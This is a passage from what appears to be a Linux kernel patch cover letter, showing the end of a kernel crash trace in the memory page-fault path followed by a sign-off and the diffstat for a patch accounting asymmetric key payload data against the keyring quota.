+[  291.611463][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
+[  291.611885][T10195]  ? __pfx___alloc_pages_noprof+0x10/0x10=0D=0D
+[  291.612350][T10195]  ? __pfx___lock_acquire+0x10/0x10=0D=0D
+[  291.612755][T10195]  ? __sanitizer_cov_trace_switch+0x54/0x90=0D=0D
+[  291.613198][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
+[  291.613615][T10195]  ? policy_nodemask+0xf2/0x4f0=0D=0D
+[  291.613993][T10195]  alloc_pages_mpol_noprof+0x2ce/0x610=0D=0D
+[  291.614417][T10195]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10=0D=0D
+[  291.614859][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
+[  291.615294][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
+[  291.615709][T10195]  ? xas_load+0x49/0x5b0=0D=0D
+[  291.616038][T10195]  ? filemap_get_entry+0xd5/0x3c0=0D=0D
+[  291.616444][T10195]  folio_alloc_noprof+0x23/0xd0=0D=0D
+[  291.616820][T10195]  filemap_alloc_folio_noprof+0x35d/0x420=0D=0D
+[  291.617244][T10195]  ? __pfx_filemap_alloc_folio_noprof+0x10/0x10=0D=0D
+[  291.617694][T10195]  ? filemap_fault+0x631/0x2800=0D=0D
+[  291.618086][T10195]  __filemap_get_folio+0x53e/0xaf0=0D=0D
+[  291.618499][T10195]  filemap_fault+0x675/0x2800=0D=0D
+[  291.618878][T10195]  ? __pfx_filemap_fault+0x10/0x10=0D=0D
+[  291.619284][T10195]  ? do_pte_missing+0x165a/0x3ff0=0D=0D
+[  291.619662][T10195]  ? __pfx_lock_release+0x10/0x10=0D=0D
+[  291.620055][T10195]  ? __pfx_filemap_map_pages+0x10/0x10=0D=0D
+[  291.620471][T10195]  __do_fault+0x10f/0x4a0=0D=0D
+[  291.620800][T10195]  ? __pfx_filemap_map_pages+0x10/0x10=0D=0D
+[  291.621210][T10195]  do_pte_missing+0x174c/0x3ff0=0D=0D
+[  291.621585][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
+[  291.622002][T10195]  ? reacquire_held_locks+0x20b/0x4c0=0D=0D
+[  291.622399][T10195]  ? lock_vma_under_rcu+0x143/0x980=0D=0D
+[  291.622797][T10195]  __handle_mm_fault+0xfa3/0x2a10=0D=0D
+[  291.623201][T10195]  ? __pfx_lock_release+0x10/0x10=0D=0D
+[  291.623574][T10195]  ? down_read_trylock+0x1f0/0x3f0=0D=0D
+[  291.623959][T10195]  ? __pfx___handle_mm_fault+0x10/0x10=0D=0D
+[  291.624373][T10195]  ? __pfx_down_read_trylock+0x10/0x10=0D=0D
+[  291.624818][T10195]  ? __pfx_lock_vma_under_rcu+0x10/0x10=0D=0D
+[  291.625252][T10195]  handle_mm_fault+0x3f5/0xa00=0D=0D
+[  291.625639][T10195]  do_user_addr_fault+0x50a/0x1490=0D=0D
+[  291.626067][T10195]  exc_page_fault+0x5d/0xe0=0D=0D
+[  291.626421][T10195]  asm_exc_page_fault+0x26/0x30=0D=0D
+[  291.626781][T10195] RIP: 0033:0x7f7f7505e080=0D=0D
+[  291.627107][T10195] Code: Unable to access opcode bytes at 0x7f7f7505e05=
+6.=0D=0D
+[  291.627583][T10195] RSP: 002b:00007ffc585a1b08 EFLAGS: 00010202=0D=0D
+[  291.628015][T10195] RAX: 00007ffc585a2120 RBX: 00007ffc585a2040 RCX: 000=
+0000000000002=0D=0D
+[  291.628553][T10195] RDX: 00007ffc585a2100 RSI: 0000000000000025 RDI: 000=
+0560a6a8580a7=0D=0D
+[  291.629082][T10195] RBP: 00007ffc585a2210 R08: 00007ffc585a2230 R09: 000=
+0000000000058=0D=0D
+[  291.629623][T10195] R10: 00007ffc585a2210 R11: 0000000000000246 R12: 000=
+0560a6bf4d2a0=0D=0D
+[  291.630161][T10195] R13: 0000560a6bf5d0b0 R14: 00007ffc585a2100 R15: 000=
+0560a6a8580a7=0D=0D
+[  291.630738][T10195]  </TASK>=0D=0D
+[  291.631265][T10195] Kernel Offset: disabled=0D=0D
+[  291.631642][T10195] Rebooting in 86400 seconds..=0D=0D
+
+-----END crash log-----
+
+Best regards,
+Yuqi Xu
+
+Yuqi Xu (1):
+  KEYS: Account for asymmetric key payload data in the quota
+
+ crypto/asymmetric_keys/pkcs8_parser.c    |  2 +-
+ crypto/asymmetric_keys/x509_public_key.c | 23 ++++++++++++++++++++++-
+ 2 files changed, 23 insertions(+), 2 deletions(-)
+
+
+base-commit: 10396a2d6d41d594975b6ece712278570c3c970c
+--=20
+2.55.0
+
